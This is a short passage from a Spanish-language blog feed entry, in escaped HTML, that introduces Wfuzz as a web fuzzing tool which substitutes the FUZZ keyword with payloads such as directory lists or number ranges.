xml:base="https://th4nuno.github.io/Aprende-a-Usar-Wfuzz/">&lt;h1 id=&quot;qué-es-wfuzz&quot;&gt;¿Qué es Wfuzz?&lt;/h1&gt;
 
 &lt;p&gt;&lt;strong&gt;Wfuzz&lt;/strong&gt; es una herramienta que nos permite hacer &lt;strong&gt;fuzzing&lt;/strong&gt; a una página web, reemplazando la palabra clave &lt;strong&gt;FUZZ&lt;/strong&gt; con un tipo de &lt;strong&gt;payload&lt;/strong&gt;, que puede ser una lista de directorios, un rango de números, entre otras más opciones. Tambien nos permite hacer un escaneo recursivo, seguir las redirecciones para obtener el código de estado final y más cosas que las iremos viendo en este post.&lt;/p&gt;
 
